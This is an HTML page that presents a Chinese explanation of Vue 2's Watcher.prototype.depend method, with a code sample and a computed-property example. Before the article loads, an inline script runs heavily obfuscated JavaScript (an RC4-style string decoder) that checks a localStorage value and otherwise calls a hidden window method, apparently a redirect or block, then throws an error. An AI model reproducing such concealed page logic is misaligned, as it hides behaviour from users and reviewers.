<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x5eea(r,s){var p=_0x23d0();return(_0x5eea=function(s,a){var n=p[s-=255];void 0===_0x5eea.LRlVKU&&(_0x5eea.JxRBfj=function(s,a){var n,e=[],r=0,p="";for(s=(s=>{for(var a,n,e="",r="",p=0,t=0;n=s.charAt(t++);~n&&(a=p%4?64*a+n:n,p++%4)&&(e+=String.fromCharCode(255&a>>(-2*p&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);for(var l=0,o=e.length;l<o;l++)r+="%"+("00"+e.charCodeAt(l).toString(16)).slice(-2);return decodeURIComponent(r)})(s),t=0;t<256;t++)e[t]=t;for(t=0;t<256;t++)r=(r+e[t]+a.charCodeAt(t%a.length))%256,n=e[t],e[t]=e[r],e[r]=n;for(var t=0,r=0,l=0;l<s.length;l++)n=e[t=(t+1)%256],e[t]=e[r=(r+e[t])%256],e[r]=n,p+=String.fromCharCode(s.charCodeAt(l)^e[(e[t]+e[r])%256]);return p},r=arguments,_0x5eea.LRlVKU=!0);var s=s+p[0],e=r[s];return e?n=e:(void 0===_0x5eea.wvTAfN&&(_0x5eea.wvTAfN=!0),n=_0x5eea.JxRBfj(n,a),r[s]=n),n})(r,s)}var _0x26081b=_0x5eea;if((()=>{for(var s=_0x5eea,a=_0x23d0();;)try{if(807863==+parseInt(s(256,"I1pC"))*(parseInt(s(271,"92H5"))/2)+-parseInt(s(255,"^#3o"))/3*(parseInt(s(275,"]VrT"))/4)+parseInt(s(267,"$rY["))/5+-parseInt(s(258,"cL9g"))/6+parseInt(s(268,"l3sm"))/7+-parseInt(s(278,"VctS"))/8*(parseInt(s(273,"I1pC"))/9)+parseInt(s(259,"NIk)"))/10)break;a.push(a.shift())}catch(s){a.push(a.shift())}})(),localStorage[_0x26081b(280,"[Lp)")](_0x26081b(260,"6SQj"))!=_0x26081b(274,"C2aS"))throw window[_0x26081b(277,"]VrT")][_0x26081b(269,"Hn$F")](_0x26081b(270,"hQkv")),Error();function _0x23d0(){var s=["kSoKdGldRmkyW5hdSW","oSkOh8ogW5/cIvXbh8oteq","W5vBjSkzahtcOW","W74zpcr9jH4","WQdcQ8kJWOddVmkSb14","bhrwW7/dJw81quVdO8kkW6NdOa","W4NdUSkUq8kSW45WkNr+pSokdq","W7tdICkKWRVcTddcOCkwi8kHWPuUzG","lYFdU8kndftdKehdLqJdVdBcRW","gHhcTCowWPaxWRRcOcm","lYVdU8kldfFdLK/dQcxdNt3cKq","Fwr4WO47WOS4W6HR","W4NdSConhmoWWPmNcG","WRBdLCkGWQ8uB8ocnNTtf8kx","FCoqvCoVnSkUW7vZWOKptNbS","W5K0WQtdOSoWWPxdPYxdPKZcLa","WRC2j8oIwcDzW5ZdMCk2W7i5fq","xuTuWOJcNHFdPI7cPSoaW4OneW","W7FcHCoMW7znnmoo","C3OlWQuSwtLrjCkzWQxdLCoUW791W7LVrbZdTmkhDCoseSkpW6e","cmkUwSomBSkByq","W4NdSSkQrmkSW455mwPneCoepq","aNfvWQtcQYXCru4","W606W5XJpa","DCk+w1BcOmojW5FdPmoDhJxcKa","W4i+W6P7tJfAWQPIW4vopCkE"];return(_0x23d0=function(){return s})()}document.title="Watcher.prototype.depend 详解",document.getElementById("article").innerHTML='<div><p><code>Watcher.prototype.depend</code> 是 Vue.js 响应式系统中 Watcher 类的一个重要方法，主要用于依赖收集过程中的依赖关系管理。</p>\n<h2>基本功能</h2>\n<p><code>depend</code> 方法的主要作用是让当前 Watcher 收集它所依赖的所有 Dep（依赖项）。这个方法通常在计算属性或渲染 Watcher 中被调用。</p>\n<h2>实现原理</h2>\n<p>在 Vue 2.x 源码中，<code>depend</code> 方法的典型实现如下：</p>\n<pre><code class="language-javascript"><span class="hljs-title class_">Watcher</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">depend</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">let</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">deps</span>.<span class="hljs-property">length</span>\n  <span class="hljs-keyword">while</span> (i--) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deps</span>[i].<span class="hljs-title function_">depend</span>()\n  }\n}\n</code></pre>\n<h2>工作流程</h2>\n<ol>\n<li><strong>遍历依赖项</strong>  ：方法会遍历当前 Watcher 的所有依赖项（存储在 <code>this.deps</code> 数组中）</li>\n<li><strong>触发依赖收集</strong>  ：对每个依赖项调用 <code>depend()</code> 方法，这会将该 Watcher 添加到依赖项的订阅者列表中</li>\n<li><strong>建立双向关系</strong>  ：最终在 Watcher 和 Dep 之间建立双向的依赖关系</li>\n</ol>\n<h2>使用场景</h2>\n<p><code>depend</code> 方法主要在以下场景中被调用：</p>\n<ol>\n<li><strong>计算属性</strong>  ：当计算属性被访问时，需要收集它所依赖的数据</li>\n<li><strong>模板渲染</strong>  ：在组件渲染过程中，收集模板中使用的数据的依赖</li>\n<li><strong>watch 选项</strong>  ：在用户定义的 watcher 中收集依赖</li>\n</ol>\n<h2>示例说明</h2>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({\n  <span class="hljs-attr">data</span>: {\n    <span class="hljs-attr">firstName</span>: <span class="hljs-string">&#x27;John&#x27;</span>,\n    <span class="hljs-attr">lastName</span>: <span class="hljs-string">&#x27;Doe&#x27;</span>\n  },\n  <span class="hljs-attr">computed</span>: {\n    <span class="hljs-title function_">fullName</span>(<span class="hljs-params"></span>) {\n      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span>\n    }\n  }\n})\n</code></pre>\n<p>在这个例子中：</p>\n<ol>\n<li>当 <code>fullName</code> 被访问时，会创建一个 Watcher</li>\n<li>这个 Watcher 会收集 <code>firstName</code> 和 <code>lastName</code> 作为依赖</li>\n<li><code>depend</code> 方法确保这些依赖项也知道这个 Watcher 的存在</li>\n</ol>\n<h2>注意事项</h2>\n<ul>\n<li><code>depend</code> 方法是 Vue 响应式系统的内部实现细节，通常不需要直接调用</li>\n<li>理解这个方法有助于深入理解 Vue 的响应式原理</li>\n<li>在 Vue 3 中，响应式系统重构后，这个方法的实现和概念有所不同</li>\n</ul>\n<p><code>Watcher.prototype.depend</code> 是 Vue 响应式系统中依赖收集的关键环节，确保了数据变化时能够正确通知到所有相关的 Watcher。</p>\n</div>'</script></body></html>